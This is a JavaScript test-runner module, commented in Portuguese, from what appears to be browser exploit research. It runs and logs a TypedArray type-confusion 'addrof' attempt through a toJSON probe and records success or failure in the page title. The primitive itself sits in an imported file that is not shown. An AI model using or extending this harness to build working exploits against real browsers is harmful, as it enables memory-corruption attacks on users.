// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_ExploitReturnedMarker,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_ExploitReturnedMarker";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (ExploitReturnedMarker) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_ExploitReturnedMarker(); 

    logS3(`   Total de chamadas da sonda toJSON durante o teste: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER); 
    
    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-ERM) ERR: ${result.errorOccurred.name}`;
    } else {
        logS3(`   RESULTADO: Completou. Detalhes da sonda que (potencialmente) modificou o marcador: ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`   Stringify Output (Objeto Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
        
        let heisenbugOnMarker = false;
        if (result.toJSON_details && result.toJSON_details.this_is_returned_marker && 
            result.toJSON_details.this_type === "[object Object]") {
            heisenbugOnMarker = true;
        }

        let anyAddrofSuccess = false;
        const results_to_log = [
            {name: "VictimA", res: result.addrof_victim_A},
            {name: "VictimB", res: result.addrof_victim_B},
            {name: "MarkerA", res: result.addrof_marker_A},
            {name: "MarkerB", res: result.addrof_marker_B}
        ];

        results_to_log.forEach(item => {
            if (item.res && item.res.success) {
                 logS3(`     ADDROF ${item.name} SUCESSO! ${item.res.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
            } else if (item.res) {
                 logS3(`     ADDROF ${item.name} FALHOU: ${item.res.msg}`, "warn", FNAME_RUNNER);
            }
        });


        if (result.toJSON_details && result.toJSON_details.error_in_probe) {
            logS3(`     ERRO INTERNO NA SONDA (quando 'this' era o marcador): ${result.toJSON_details.error_in_probe}`, "warn", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-ERM) toJSON_ERR`;
        } else if (heisenbugOnMarker) {
            logS3(`     !!!! TYPE CONFUSION NO OBJETO MARCADOR OBSERVADA !!!! (Chamada #${result.toJSON_details.call_number})`, "critical", FNAME_RUNNER);
            if (result.toJSON_details.writes_to_victim_buffer_attempted) { 
                logS3(`       Tentativas de escrita no buffer da vítima (via this.victim_buffer_ref) realizadas.`, "info");
            }
            if (result.toJSON_details.writes_to_controller_props_attempted) { // Renomeado para clareza, esta flag era de v21
                 logS3(`       Tentativas de escrita nas propriedades do marcador (leaky_prop_A/B) realizadas.`, "info");
            }
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-ERM) Marker TC, Addr Fail`;
            } else {
                 document.title = `Heisenbug (TypedArray-ERM) AddrInMarker SUCCESS!`;
            }
        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM) || document.title.includes("Probing")) {
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-ERM) Test OK`;
            }
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (ExploitReturnedMarker) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (ExploitReturnedMarker) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCESSO") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("Marker TC")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V24_ERM} Concluído`;
        }
    }
}
